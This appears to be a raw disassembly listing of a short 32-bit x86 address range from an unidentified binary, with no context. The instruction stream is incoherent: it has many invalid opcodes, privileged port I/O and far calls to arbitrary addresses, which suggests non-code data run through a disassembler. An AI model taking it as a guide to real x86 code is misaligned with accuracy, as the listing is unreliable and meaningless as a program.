  41f9b4:	adc    eax,0x3c5164
  41f9b9:	add    BYTE PTR [eax],al
  41f9bb:	add    BYTE PTR [eax],al
  41f9bd:	add    BYTE PTR [ecx-0x7f],cl
  41f9c0:	clc    
  41f9c1:	dec    bl
  41f9c3:	loop   0x41fa11
  41f9c5:	push   eax
  41f9c6:	xor    al,0x96
  41f9c8:	je     0x41fa0a
  41f9ca:	mov    WORD PTR [ecx+0x48c0268],fs
  41f9d0:	mov    DWORD PTR [ebp-0x41dd4],esi
  41f9d6:	mov    ah,0x73
  41f9d8:	sar    esi,1
  41f9da:	fstp   TBYTE PTR [esi-0x40]
  41f9dd:	or     al,0x3b
  41f9df:	inc    esp
  41f9e0:	add    eax,0x8af7ef75
  41f9e6:	lock fstp DWORD PTR [edi-0x4]
  41f9ea:	(bad)  
  41f9eb:	cli    
  41f9ec:	imul   ecx,DWORD PTR ds:0x84006975,0x35
  41f9f3:	push   esi
  41f9f4:	add    al,0xb0
  41f9f6:	je     0x41f97c
  41f9f8:	add    eax,0x46133532
  41f9fd:	add    esi,DWORD PTR [ebp-0x72]
  41fa00:	mov    ebp,ebx
  41fa02:	hlt    
  41fa03:	mov    ebp,0x697502ef
  41fa08:	mov    bl,0x54
  41fa0a:	lock out 0x97,al
  41fa0d:	cli    
  41fa0e:	sbb    bl,BYTE PTR [ecx]
  41fa10:	mov    ah,0x67
  41fa12:	xchg   ecx,eax
  41fa13:	xchg   ecx,eax
  41fa14:	sar    bh,0x12
  41fa17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa18:	repnz inc DWORD PTR [edx]
  41fa1b:	out    0x43,al
  41fa1d:	or     al,0xf1
  41fa1f:	or     BYTE PTR [eax+eax*1],al
  41fa22:	add    BYTE PTR [eax],al
  41fa24:	add    BYTE PTR [eax],al
  41fa26:	add    BYTE PTR [ebp-0x22],dh
  41fa29:	test   BYTE PTR [edi+0x4f5f08e9],ch
  41fa2f:	lock out 0x97,al
  41fa32:	cli    
  41fa33:	ficomp DWORD PTR [eax-0x50]
  41fa36:	cld    
  41fa37:	push   0x753ff541
  41fa3c:	mov    dh,0x84
  41fa3e:	scas   eax,DWORD PTR es:[edi]
  41fa3f:	shl    DWORD PTR [eax+0x5f],0x4f
  41fa43:	mov    edx,0x388b0bae
  41fa48:	popa   
  41fa49:	call   0x46b27d1
  41fa4e:	push   eax
  41fa4f:	lea    edi,[edx+0x35]
  41fa52:	std    
  41fa53:	call   0x5f91:0xf60f44ec
  41fa5a:	or     al,0xf1
  41fa5c:	test   BYTE PTR [eax],al
  41fa5e:	add    BYTE PTR [ebp+0x2],dh
  41fa61:	aaa    
  41fa62:	popa   
  41fa63:	pop    es
  41fa64:	or     ch,BYTE PTR [esi+eax*4+0x26]
  41fa68:	push   ebp
  41fa69:	xchg   ebp,eax
  41fa6a:	pusha  
  41fa6b:	mov    edx,0x62f2e26a
  41fa70:	push   edi
  41fa71:	test   esi,edx
  41fa73:	jb     0x41fa01
  41fa75:	sahf   
  41fa76:	imul   esp,DWORD PTR [esi-0x99f8bbf],0x3a
  41fa7d:	fld    QWORD PTR [edi+0x3e701fb]
  41fa83:	out    dx,al
  41fa84:	jl     0x41fa18
  41fa86:	pop    esi
  41fa87:	xor    DWORD PTR [edi-0x4a],edx
  41fa8a:	jmp    0x41fa8c
  41fa8c:	add    BYTE PTR [eax],al
  41fa8e:	add    BYTE PTR [eax],al
  41fa90:	(bad)  
  41fa91:	fldenv [esi-0x17f823fd]
  41fa97:	add    esi,DWORD PTR [ebp-0x7b]
  41fa9a:	jnp    0x41fb13
  41fa9c:	or     al,0x57
  41fa9e:	xor    eax,0x2c2df06b
  41faa3:	pusha  
  41faa4:	stos   DWORD PTR es:[edi],eax
  41faa5:	mov    ecx,0xd7f95b69
  41faaa:	test   bl,ch
  41faac:	jbe    0x41faaf
  41faae:	out    0x3,eax
  41fab0:	(bad)  
  41fab1:	jl     0x41fb05
  41fab3:	pop    esi
  41fab4:	loope  0x41fb0c
  41fab6:	xchg   esi,eax
  41fab7:	jmp    0x41fadf
  41fab9:	fisub  DWORD PTR [esi-0x69132ffd]
  41fabf:	repnz mov al,BYTE PTR [edx]
  41fac2:	lahf   
  41fac3:	push   ds
  41fac4:	ja     0x41fac7
  41fac6:	out    0x3,eax
  41fac8:	inc    eax
  41fac9:	mov    edi,0x5765c850
  41face:	arpl   cx,cx
  41fad0:	out    dx,al
  41fad1:	scas   al,BYTE PTR es:[edi]
  41fad2:	ss pop edi
  41fad4:	xchg   edx,eax
  41fad6:	fadd   st(3),st
  41fad8:	call   0xff42:0x4410a283
  41fadf:	dec    esi
  41fae0:	clc    
  41fae1:	ret    
  41fae2:	jmp    0x41fafa
  41fae4:	in     al,0xc3
  41fae6:	mov    ebx,0x828bc239
  41faeb:	jne    0x41fabc
  41faed:	push   esi
  41faee:	cld    
  41faef:	cmp    DWORD PTR [ecx+eax*4],eax
  41faf2:	mov    bl,0x8c
  41faf4:	add    BYTE PTR [eax],al
  41faf6:	add    BYTE PTR [eax],al
  41faf8:	add    dl,al
  41fafa:	push   esi
  41fafb:	dec    edi
  41fafc:	scas   al,BYTE PTR es:[edi]
  41fafd:	sub    al,0x9a
  41faff:	inc    ebx
  41fb00:	jmp    0x2d06fd7b
  41fb05:	fst    DWORD PTR [esp+edi*8-0x17]
  41fb09:	jbe    0x41fb75
  41fb0b:	pop    es
  41fb0c:	fs call 0xf496:0x2e41f456
  41fb14:	xor    DWORD PTR [esi-0x29b74f9],ebx
  41fb1a:	pop    eax
  41fb1b:	cld    
  41fb1c:	inc    esi
  41fb1d:	loope  0x41fb7c
  41fb1f:	es out dx,eax
  41fb21:	jns    0x41fb25
  41fb23:	xor    ch,BYTE PTR [ecx]
  41fb25:	retf   0xc6ba
  41fb28:	sub    ebp,DWORD PTR [ebp+0x2]
  41fb2b:	push   0xffffffe9
  41fb2d:	or     al,0x56
  41fb2f:	(bad)
  41fb32:	int    0x3f
  41fb34:	jmp    0xf7c5eb84
  41fb39:	mov    dh,0x55
  41fb3b:	xchg   DWORD PTR [edi+0x2ac58b72],ebp
  41fb41:	or     ecx,DWORD PTR [ebx+0x55c601ee]
  41fb47:	cld    
  41fb48:	jmp    0xf165bc75
  41fb4d:	jno    0x41fb1d
  41fb4f:	add    eax,0xbf812137
  41fb54:	xlat   BYTE PTR ds:[ebx]
  41fb55:	dec    ebx
  41fb56:	mov    al,ch
  41fb58:	das    
  41fb59:	aaa    
  41fb5a:	add    DWORD PTR [eax],eax
  41fb5c:	add    BYTE PTR [eax],al
  41fb5e:	add    BYTE PTR [eax],al
  41fb60:	add    BYTE PTR [eax],al
  41fb62:	jp     0x41faed
  41fb64:	in     eax,dx
  41fb65:	mov    ebx,DWORD PTR [edx+0xa]
  41fb68:	ret    
  41fb69:	push   es
  41fb6a:	fdivr  DWORD PTR [ecx]
  41fb6c:	cmp    al,0x0
  41fb6e:	sbb    ecx,eax
  41fb70:	jo     0x41fb77
  41fb72:	ud1    edi,ebp
  41fb75:	je     0x41fbdd
  41fb77:	mov    ah,0x11
  41fb79:	mov    WORD PTR [edx+0x41],gs
  41fb7c:	cld    
  41fb7d:	add    BYTE PTR [edx+0xf5efb0a],0x88
  41fb84:	cmp    al,0x4
  41fb86:	fld    st(1)
  41fb88:	jo     0x41fb99
  41fb8a:	fistp  QWORD PTR [ecx+0x225673fd]
  41fb90:	push   es
  41fb91:	add    DWORD PTR [ebp-0x7f],ecx
  41fb94:	jo     0x41fb99
  41fb96:	(bad)  
  41fb97:	mov    esi,0x415c33bf
  41fb9c:	mov    edi,0x4de59755
  41fba1:	sub    DWORD PTR [ecx],0xffffffb5
  41fba4:	cld    
  41fba5:	mov    ecx,ds
  41fba7:	mov    ah,0x4c
  41fba9:	dec    ecx
  41fbab:	add    al,0x68
  41fbad:	add    eax,ebx
  41fbaf:	add    BYTE PTR [eax],al
  41fbb1:	push   0xc
  41fbb3:	mov    ah,0x71
  41fbb5:	or     BYTE PTR [ebx+0x1c168c5a],dl
  41fbbb:	add    DWORD PTR [ecx-0x7903fb40],eax
  41fbc1:	inc    ebp
  41fbc2:	jo     0x41fb4e
  41fbc4:	mov    esp,0x75
  41fbc9:	add    BYTE PTR [eax],al
  41fbcb:	fsubp  st(7),st
  41fbcd:	mov    edi,0x99ec9
  41fbd2:	push   edi
  41fbd3:	div    BYTE PTR [ebx-0x4a478905]
  41fbd9:	adc    DWORD PTR [eax],esp
  41fbdb:	scas   eax,DWORD PTR es:[edi]
  41fbdc:	inc    eax
  41fbdd:	cld    
  41fbde:	mov    dh,BYTE PTR [ebp+0x25]
  41fbe1:	hlt    
  41fbe2:	mov    ch,bl
  41fbe4:	bound  eax,QWORD PTR [ecx]
  41fbe6:	add    BYTE PTR [ebp-0x30],dh
  41fbe9:	iret   
  41fbea:	and    edi,DWORD PTR [ebp-0x2e]
  41fbed:	mov    ecx,DWORD PTR [ebx]
  41fbef:	je     0x41fc5c
  41fbf1:	add    BYTE PTR [ecx-0x771dc4c5],cl
  41fbf7:	sub    DWORD PTR [edi+0xc],eax
  41fbfa:	xchg   DWORD PTR ds:0x75000152,ecx
  41fc00:	loopne 0x41fbc7
  41fc02:	pand   mm4,mm2
  41fc05:	mov    ecx,DWORD PTR [edi]
  41fc07:	je     0x41fc72
  41fc09:	add    ch,bh
  41fc0b:	retf   
  41fc0c:	sub    eax,0x37e9125b
  41fc11:	sar    bh,0xab
  41fc14:	in     al,0xf4
  41fc16:	sbb    esp,DWORD PTR [eax-0x57]
  41fc19:	add    BYTE PTR [ebx+0x50fa2e35],al
  41fc1f:	sub    WORD PTR [edi+eiz*2+0x6788],si
  41fc27:	ret    0xc801
  41fc2a:	and    edx,DWORD PTR [ebp-0x73]
  41fc2d:	or     ch,bh
  41fc2f:	add    BYTE PTR [eax],al
  41fc31:	add    BYTE PTR [eax],al
  41fc33:	add    BYTE PTR [eax-0x1f],ah
  41fc36:	idiv   DWORD PTR [edi]
  41fc38:	jne    0x41fbfa
  41fc3a:	add    eax,0xf7ed60fd
  41fc3f:	aas    
  41fc40:	jne    0x41fc12
  41fc42:	inc    edx
  41fc43:	pop    esp
  41fc44:	mov    bh,0x5d
  41fc46:	add    BYTE PTR [ebx-0x12],dl
  41fc49:	push   ebp
  41fc4a:	jg     0x41fc37
  41fc4c:	jns    0x41fcc6
  41fc4e:	mov    dl,0x54
  41fc50:	(bad)  
  41fc51:	push   edi
  41fc52:	out    0xfc,al
  41fc54:	retf   0xf4d3
  41fc57:	mov    BYTE PTR [ebp+0x60fc58e0],bl
  41fc5d:	add    al,BYTE PTR [edi]
  41fc5f:	icebp  
  41fc60:	jb     0x41fc64
  41fc62:	jb     0x41fc29
  41fc64:	jp     0x41fbed
  41fc66:	pop    esi
  41fc67:	or     esp,DWORD PTR [edx-0x1ff319ad]
  41fc6d:	adc    dh,0x2
  41fc70:	jne    0x41fc74
  41fc72:	mov    esi,0x238966d5
  41fc77:	pusha  
  41fc78:	sti    
  41fc79:	mov    ebp,0x76675cae
  41fc7e:	clc    
  41fc7f:	ret    
  41fc80:	jb     0x41fc08
  41fc82:	and    ebp,DWORD PTR [edx+edi*4+0x53]
  41fc86:	sbb    esp,DWORD PTR [eax+0x61]
  41fc89:	in     eax,dx
  41fc8a:	or     bh,al
  41fc8c:	call   0xac7e:0x81436c02
  41fc93:	add    esi,DWORD PTR [ebp+0x2]
  41fc96:	or     eax,0x81
  41fc9b:	add    BYTE PTR [eax],al
  41fc9d:	mov    edi,0x5fd6e85a
  41fca2:	xchg   esp,ebx
  41fca4:	repz pop ebp
  41fca6:	xchg   esp,eax
  41fca7:	out    0x2,al
  41fca9:	jne    0x41fcad
  41fcab:	add    bh,BYTE PTR [esi+0x76]
  41fcae:	add    edi,esp
  41fcb0:	add    ebx,DWORD PTR [edx]
  41fcb2:	(bad)  
  41fcb3:	dec    esi
  41fcb4:	add    ch,BYTE PTR [esi+0x1adee766]
  41fcba:	add    DWORD PTR [edi+edx*2-0x6b223bf3],edx
  41fcc1:	mov    bh,0x5a
  41fcc3:	imul   ebx,DWORD PTR [ebx+0x7f],0x87d7fad3
  41fcca:	retf   0xd79e
  41fccd:	jae    0x41fc99
  41fccf:	sahf   
  41fcd0:	xlat   BYTE PTR ds:[ebx]
  41fcd1:	jp     0x41fd52
  41fcd3:	push   cs
  41fcd4:	add    eax,0xd7af1c49
  41fcd9:	ins    DWORD PTR es:[edi],dx
  41fcda:	retf   0x7bff
  41fcdd:	imul   bp,WORD PTR [eax],0x9b60
  41fce2:	pop    edx
  41fce3:	call   0xd9cf6f7
  41fce8:	push   ebp
  41fce9:	scas   eax,DWORD PTR es:[edi]
  41fcea:	mov    edx,0xceaeff73
  41fcef:	or     BYTE PTR [ecx],ah
  41fcf1:	(bad)  
  41fcf2:	stc    
  41fcf3:	xchg   BYTE PTR [eiz*1+0x1ab97a7c],ah
  41fcfa:	xacquire xchg BYTE PTR [eiz*1+0xc17a7c],dl
  41fd02:	add    BYTE PTR [eax],al
  41fd04:	add    BYTE PTR [eax],al
  41fd06:	or     cl,BYTE PTR [edx]
  41fd08:	xchg   DWORD PTR [ebp+eax*8+0x5a],eax
  41fd0c:	add    eax,0x86624c70
  41fd11:	xor    al,0xcd
  41fd13:	jl     0x41fd57
  41fd15:	and    DWORD PTR [ecx],0x45cd124f
  41fd1b:	adc    al,BYTE PTR [eax]
  41fd1d:	fs mov cl,0xd4
  41fd20:	dec    ebp
  41fd21:	add    ebp,DWORD PTR [ecx-0x61928db2]
  41fd27:	hlt    
  41fd28:	aaa    
  41fd29:	cld    
  41fd2a:	ss push edx
  41fd2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd2d:	jmp    0xdd81ffa8
  41fd32:	push   ds
  41fd33:	fadd   QWORD PTR [ecx]
  41fd35:	pop    esp
  41fd36:	xor    al,0x6a
  41fd38:	dec    edi
  41fd39:	inc    esi
  41fd3a:	and    al,0x4e
  41fd3c:	cld    
  41fd3d:	aam    0xf2
  41fd3f:	cmc    
  41fd40:	aas    
  41fd41:	jmp    0x2e41d90c
  41fd46:	add    al,0xf2
  41fd48:	adc    ch,BYTE PTR [ecx+0x15427b76]
  41fd4e:	call   0xffe3:0x7a81ebc5
  41fd55:	call   0x847880
  41fd5a:	int3   
  41fd5b:	and    BYTE PTR [ecx-0x18],al
  41fd5e:	in     al,dx
  41fd5f:	lods   al,BYTE PTR ds:[esi]
  41fd60:	jno    0x41fd4e
  41fd62:	retf   
  41fd63:	xor    ah,ah
  41fd65:	push   0xffffffcc
  41fd67:	lods   al,BYTE PTR ds:[esi]
  41fd68:	jno    0x41fd66
  41fd6a:	add    BYTE PTR [eax],al
  41fd6c:	add    BYTE PTR [eax],al
  41fd6e:	add    BYTE PTR [ebx+0x5c151452],bl
  41fd74:	push   es
  41fd75:	pop    ebx
  41fd76:	pop    esi
  41fd77:	addr16 mov edi,0xe91755bf
  41fd7d:	dec    ebp
  41fd7e:	mov    esp,DWORD PTR [ecx-0x6]
  41fd81:	sub    BYTE PTR [ecx+0x5300059c],ah
  41fd87:	arpl   WORD PTR [edx],si
  41fd89:	dec    ecx
  41fd8a:	push   0xffffff8f
  41fd8c:	mov    fs,WORD PTR [edi]
  41fd8e:	rcl    DWORD PTR [eax-0x7f3ed915],0xf6
  41fd95:	sub    BYTE PTR [edx+0x4d],bl
  41fd98:	add    eax,0x202c7400
  41fd9d:	mov    ebp,0xbd202f74
  41fda2:	psrlw  mm3,QWORD PTR [ebp-0x3bb30004]
  41fda9:	inc    ecx
  41fdaa:	cld    
  41fdab:	push   ebp
  41fdac:	pop    es
  41fdad:	add    BYTE PTR [eax],al
  41fdaf:	mov    ss,WORD PTR [ecx]
  41fdb1:	call   0xf88450e3
  41fdb6:	push   es
  41fdb7:	push   cs
  41fdb8:	add    eax,0xc4bfeb00
  41fdbd:	inc    ecx
  41fdbe:	cld    
  41fdbf:	pop    ds
  41fdc0:	pop    es
  41fdc1:	add    BYTE PTR [eax],al
  41fdc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdc4:	ffreep st(3)
  41fdc6:	inc    ebp
  41fdc7:	dec    eax
  41fdc8:	sahf   
  41fdc9:	cld    
  41fdca:	dec    DWORD PTR [eax+eiz*8]
  41fdcd:	or     al,0xc7
  41fdcf:	and    DWORD PTR [ecx+0xa2],edi
  41fdd5:	add    BYTE PTR [eax],al
  41fdd7:	add    ah,bl
  41fdd9:	add    al,0xe7
  41fddb:	pop    es
  41fddc:	jne    0x41fdfe
  41fdde:	sar    bl,0x16
  41fde1:	pop    ebx
  41fde2:	add    BYTE PTR [eax],al
  41fde4:	push   es
  41fde5:	pop    edx
  41fde6:	pop    ecx
  41fde7:	adc    bh,BYTE PTR [ebp+0x2c]
  41fdea:	sar    bh,0xef
  41fded:	push   edx
  41fdee:	mov    al,BYTE PTR [edx+0x6d]
  41fdf1:	xchg   edx,eax
  41fdf2:	jle    0x41fe5f
  41fdf4:	je     0x41fe51
  41fdf6:	add    BYTE PTR [ebx+0x3d],dh
  41fdf9:	aam    0x89
  41fdfb:	addr16 je 0x41fe59
  41fdfe:	add    BYTE PTR [ecx],bh
  41fe00:	sub    BYTE PTR [edi],ch
  41fe02:	int    0x3a
  41fe04:	(bad)  
  41fe05:	xchg   edi,eax
  41fe06:	sub    cl,BYTE PTR [esi+0x5a11]
  41fe0c:	hlt    
  41fe0d:	xchg   ecx,eax
  41fe0e:	imul   eax,DWORD PTR [eax],0x75
  41fe11:	pop    ebx
  41fe12:	iret   
  41fe13:	sub    bh,cl
  41fe15:	inc    esp
  41fe16:	int3   
  41fe17:	or     bl,bh
  41fe19:	xchg   DWORD PTR [ebx-0x10327704],esi
  41fe1f:	aas    
  41fe20:	jne    0x41fde3
  41fe22:	or     esi,DWORD PTR [esp+ebp*2-0x74]
  41fe26:	inc    eax
  41fe27:	xchg   bl,dh
  41fe29:	icebp  
  41fe2a:	add    BYTE PTR [eax],al
  41fe2c:	jne    0x41fe10
  41fe2e:	and    DWORD PTR [ebx+0x74],0xfb870059
  41fe35:	xor    eax,0xd4750001
  41fe3a:	mov    esp,0xfb
  41fe3f:	add    BYTE PTR [eax],al
  41fe41:	push   cs
  41fe42:	push   ebp
  41fe43:	mov    eax,DWORD PTR [edx+0x6d]
  41fe46:	in     al,0xc4
  41fe48:	or     edi,esp
  41fe4a:	xlat   BYTE PTR ds:[ebx]
  41fe4b:	jmp    0x41fe4b
  41fe4d:	or     bl,BYTE PTR [edx-0x77]
  41fe50:	mov    ebp,0x5a99
  41fe55:	in     al,dx
  41fe56:	out    0xe7,eax
  41fe58:	(bad)  
  41fe59:	repnz add ah,bh
  41fe5c:	mov    WORD PTR [edi],?
  41fe5e:	(bad)  
  41fe5f:	mov    ebp,0xde44bbbc
  41fe64:	add    eax,DWORD PTR [esi+0x7b]
  41fe67:	cli    
  41fe68:	mov    dl,0x25
  41fe6a:	mov    eax,0xf64f8c9d
  41fe6f:	jno    0x41fec5
  41fe71:	inc    ebx
  41fe72:	dec    edi
  41fe73:	out    0x5,eax
  41fe75:	jne    0x41fe79
  41fe77:	jae    0x41fe6c
  41fe79:	xor    ecx,DWORD PTR [edi-0x13]
  41fe7c:	add    eax,0xc530275
  41fe81:	and    cl,BYTE PTR [edi-0x16]
  41fe84:	add    eax,0xb0540275
  41fe89:	sbb    al,0x4
  41fe8b:	(bad)  
  41fe8c:	into   
  41fe8d:	jb     0x41fede
  41fe8f:	shr    edi,cl
  41fe91:	addr16 ret 0x8ce6
  41fe95:	mov    ds:0x73d34d0b,al
  41fe9a:	dec    edi
  41fe9b:	out    0xcf,al
  41fe9d:	test   eax,0x72c655ff
  41fea2:	jge    0x41fecf
  41fea4:	pop    eax
  41fea5:	add    BYTE PTR [eax],al
  41fea7:	add    BYTE PTR [eax],al
  41fea9:	add    BYTE PTR [edx+0x80902dc],ch
  41feaf:	inc    edi
  41feb0:	adc    BYTE PTR [esi],al
  41feb2:	or     ah,BYTE PTR [edx-0x2a]
  41feb5:	or     al,0x2
  41feb7:	mov    dl,0x19
  41feb9:	out    dx,al
  41feba:	pop    ebx
  41febb:	dec    edi
  41febc:	repz or esi,DWORD PTR [eax]
  41febf:	cmc    
  41fec0:	mov    ds:0x64026aef,al
  41fec5:	inc    ebx
  41fec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fec7:	imul   BYTE PTR [ecx-0x2a]
  41feca:	push   ds
  41fecb:	add    al,0xde
  41fecd:	jg     0x41ff3a
  41fecf:	add    edi,esp
  41fed1:	add    esi,esp
  41fed3:	int3   
  41fed4:	cmp    bh,bh
  41fed6:	jno    0x41fe5e
  41fed8:	jmp    ebp
  41feda:	ja     0x41fede
  41fedc:	add    BYTE PTR [eax+0x6c],ah
  41fedf:	(bad)  
  41fee1:	call   0xbcf6fc5c
  41fee6:	out    0xfd,al
  41fee8:	mov    ah,0x2e
  41feea:	jmp    0xb73786fa
  41feef:	dec    esi
  41fef0:	mov    edi,0xc0f9c609
  41fef5:	cdq    
  41fef6:	sbb    eax,0x36007d4
  41fefb:	dec    ebx
  41fefc:	imul   ecx,ecx,0xe607d44d
  41ff02:	pop    edx
  41ff03:	in     eax,0x80
  41ff05:	pop    esp
  41ff06:	test   eax,0x8f0a734f
  41ff0b:	dec    esi
  41ff0c:	cs test eax,0x0
  41ff12:	add    dh,bh
  41ff14:	cmp    al,0xe7
  41ff16:	out    0x80,al
  41ff18:	dec    ebp
  41ff19:	cld    
  41ff1a:	mov    esi,0x7e0ceaa4
  41ff1f:	xor    DWORD PTR [edi+0x4f6534fc],edi
  41ff25:	jb     0x41ff18
  41ff27:	fsubrp st(0),st
  41ff29:	std    
  41ff2a:	sahf   
  41ff2b:	retf   0xe6bd
  41ff2e:	push   ebx
  41ff2f:	jno    0x41ff33
  41ff31:	add    BYTE PTR [esi-0x30309dc],cl
  41ff37:	jle    0x41ff93
  41ff39:	push   ebx
  41ff3a:	jg     0x41fee6
  41ff3c:	dec    esi
  41ff3d:	xchg   BYTE PTR [ecx+edi*1],ch
  41ff40:	cmp    eax,0xffffffe1
  41ff43:	jnp    0x41ffc4
  41ff45:	push   cs
  41ff46:	call   0x654f01c1
  41ff4b:	mov    WORD PTR [ebp-0x4],cs
  41ff4e:	jmp    0xde434a4a
  41ff53:	xchg   edx,eax
  41ff54:	xchg   ebx,eax
  41ff55:	(bad)  
  41ff56:	call   FWORD PTR [edx+eax*1]
  41ff59:	jg     0x41ff56
  41ff5b:	(bad)  
  41ff5d:	jae    0x41fee2
  41ff5f:	inc    edi
  41ff60:	add    esi,DWORD PTR [ebp+edx*2+0x51]
  41ff64:	cmp    esi,esi
  41ff66:	adc    DWORD PTR [ebp-0x3ebb8cf9],0xffffffa6
  41ff6d:	cld    
  41ff6e:	dec    esp
  41ff70:	cmp    eax,0x63e3d1d
  41ff75:	add    BYTE PTR [eax],al
  41ff77:	add    BYTE PTR [eax],al
  41ff79:	add    BYTE PTR [eax],al
  41ff7b:	add    BYTE PTR [eax-0x1],cl
  41ff7e:	cmp    BYTE PTR [ebx+0x740001cc],ah
  41ff84:	mov    bl,0xea
  41ff86:	lahf   
  41ff87:	add    BYTE PTR [ecx+eax*1-0x5caed78c],bl
  41ff8e:	cld    
  41ff8f:	dec    DWORD PTR [edx+esi*1+0x763e960]
  41ff96:	add    BYTE PTR [eax],al
  41ff98:	pop    ss
  41ff99:	mov    al,BYTE PTR [edx+ebp*2]
  41ff9c:	popf   
  41ff9d:	pop    ebx
  41ff9e:	cld    
  41ff9f:	imul   ecx,DWORD PTR [eax+edx*4+0x528815fb],0xde8c003c
  41ffaa:	push   ebp
  41ffab:	cld    
  41ffac:	adc    esi,DWORD PTR [edi+eax*4+0x59797445]
  41ffb3:	cld    
  41ffb4:	add    esi,DWORD PTR [edx]
  41ffb6:	sbb    al,0x53
  41ffb8:	cmc    
  41ffb9:	xor    ebx,edi
  41ffbb:	push   ebx
  41ffbd:	jmp    0x18e005e
  41ffc2:	jno    0x41ffcd
  41ffc4:	jbe    0x41ffcc
  41ffc6:	push   0xffffffff
  41ffc8:	mov    ds:0x79eb043f,eax
  41ffcd:	jmp    0x41ff6e
  41ffcf:	add    BYTE PTR [ecx+eax*1],cl
  41ffd2:	jno    0x41fff7
  41ffd4:	jne    0x420017
  41ffd6:	add    BYTE PTR [edx+0x13],ch
  41ffd9:	shl    BYTE PTR [edx+0x3a],0xd6
  41ffdd:	pop    edx
  41ffde:	add    BYTE PTR [eax],al
  41ffe0:	add    BYTE PTR [eax],al
  41ffe2:	add    BYTE PTR [eax],al
  41ffe4:	add    BYTE PTR [eax+0x55f982e],cl
  41ffea:	pop    ebx
  41ffeb:	add    ch,bh
  41ffed:	push   0xb5b504fb
  41fff2:	mov    ch,al
  41fff4:	adc    DWORD PTR [ebx+ebx*2+0x0],esi
  41fff8:	std    
  41fff9:	pusha  
  41fffa:	arpl   WORD PTR [ebp-0x2c],dx
  41fffd:	xor    bl,BYTE PTR [ebp+0x66b7c6b9]
  420003:	add    BYTE PTR [ebx],bh
  420005:	sbb    BYTE PTR [ebx+0x0],bl
  420008:	add    BYTE PTR [edx-0x21],ch
  42000b:	(bad)  
  42000c:	push   DWORD PTR [edx+0x759f175a]
  420012:	pop    ebx
  420013:	add    cl,ch
  420015:	hlt    
  420016:	in     eax,dx
  420017:	sahf   
  420018:	call   FWORD PTR [edx+0x509acc5a]
  42001e:	xchg   BYTE PTR [ebx],al
  420020:	add    BYTE PTR [ebp+0x54],dh
  420023:	jl     0x41fff7
  420025:	jne    0x420082
  420027:	add    BYTE PTR [ebx],bh
  420029:	aam    0x5a
  42002b:	add    BYTE PTR [eax],al
  42002d:	call   0x7d9c869d
  420032:	out    dx,eax
  420033:	add    ch,bh
  420035:	call   0xc841e683
  42003a:	je     0x420028
  42003c:	add    ebp,DWORD PTR [eax+0x19]
  42003f:	add    al,0x50
  420041:	pop    ebp
  420042:	popf   
  420043:	push   esi
  420044:	cld    
  420045:	inc    edx
  420046:	jno    0x41ffd4
  420048:	cmp    al,BYTE PTR [eax]
  42004a:	add    BYTE PTR [eax],al
  42004c:	add    BYTE PTR [eax],al
  42004e:	pop    ss
  42004f:	pop    edx
  420050:	add    BYTE PTR [eax],al
  420052:	and    dh,0x12
  420055:	std    
  420056:	sub    al,BYTE PTR [ebx]
  420058:	mov    WORD PTR [edi+0x56c455fe],si
  42005f:	add    ah,bh
  420061:	add    DWORD PTR [ebp-0x2a],esi
  420064:	ins    BYTE PTR es:[edi],dx
  420065:	pushf  
  420066:	push   0x52
  420068:	out    0x3,al
  42006a:	or     al,0x85
  42006c:	imul   ebx,DWORD PTR [ecx+0x73],0x304f4d6
  420073:	mov    edx,0x7fe9552d
  420078:	and    ebx,esi
  42007a:	pusha  
  42007b:	nop
  42007c:	imul   ebx,DWORD PTR [ecx-0x7a],0xcd80f4d6
  420083:	cmc    
  420084:	fnstsw WORD PTR [esi-0x80]
  420087:	dec    ebx
  420088:	add    eax,0xe6a07f55
  42008d:	add    esi,DWORD PTR [ebp-0x5]
  420090:	imul   eax,DWORD PTR [ecx],0xffffffb0
  420093:	dec    ebx
  420094:	in     eax,dx
  420095:	fwait
  420096:	sub    dl,BYTE PTR [ecx-0x1a]
  420099:	add    ebx,DWORD PTR [edx-0x66ab2251]
  42009f:	or     eax,0x2750389
  4200a4:	fidivr WORD PTR [esi-0x68]
  4200a7:	dec    esp
  4200a8:	lds    edx,FWORD PTR [ebx+ebx*4+0xc]
  4200ac:	mov    esi,0xb5897954
  4200b1:	push   esp
  4200b2:	add    BYTE PTR [eax],al
  4200b4:	add    BYTE PTR [eax],al
  4200b6:	add    BYTE PTR [edx+0x4b],dh
  4200b9:	jmp    0x42005c
  4200bb:	push   0x4b
  4200bd:	out    0xce,al
  4200bf:	fwait
  4200c0:	ja     0x4200e5
  4200c2:	or     ah,ch
  4200c4:	ror    edx,0xaa
  4200c7:	push   edx
  4200c8:	dec    ebx
  4200c9:	out    0x3,eax
  4200cb:	js     0x420053
  4200cd:	mov    ebp,0xc34b4154
  4200d2:	add    esi,DWORD PTR [ebp+0x2]
  4200d5:	add    al,ch
  4200d7:	shl    DWORD PTR [ebx],0x18
  4200da:	test   eax,0xe8ff528b
  4200df:	jbe    0x4200e0
  4200e1:	das    
  4200e2:	pop    ecx
  4200e3:	jbe    0x4200e7
  4200e5:	or     eax,0xa5ab69e
  4200ea:	or     al,0xea
  4200ec:	dec    edx
  4200ed:	cld    
  4200ee:	jmp    0x3e55806c
  4200f3:	mov    eax,ds:0xd028884e
  4200f8:	jg     0x4200b9
  4200fa:	fisubr WORD PTR [edx+0x4]
  4200fd:	std    
  4200fe:	es dec ecx
  420100:	in     eax,0x38
  420102:	sub    BYTE PTR [ecx+0x7f],dh
  420105:	in     al,dx
  420106:	pop    ss
  420107:	sub    DWORD PTR [esi-0x4],ecx
  42010a:	xchg   esp,eax
  42010b:	xchg   esi,eax
  42010c:	dec    ebp
  42010d:	jb     0x420100
  42010f:	int3   
  420110:	leave  
  420111:	out    0xf,al
  420113:	and    BYTE PTR [esi-0x4],cl
  420116:	pushf  
  420117:	std    
  420118:	push   esi
  420119:	cmp    ch,0x0
  42011c:	add    BYTE PTR [eax],al
  42011e:	add    BYTE PTR [eax],al
  420120:	jecxz  0x4200d3
  420122:	push   ebp
  420123:	jb     0x42016e
  420125:	jp     0x42016c
  420127:	stc    
  420128:	fist   WORD PTR [ecx]
  42012a:	std    
  42012b:	pusha  
  42012c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42012d:	dec    esi
  42012e:	gs adc cl,bh
  420131:	cli    
  420132:	(bad)  
  420133:	call   0xb76bd7ae
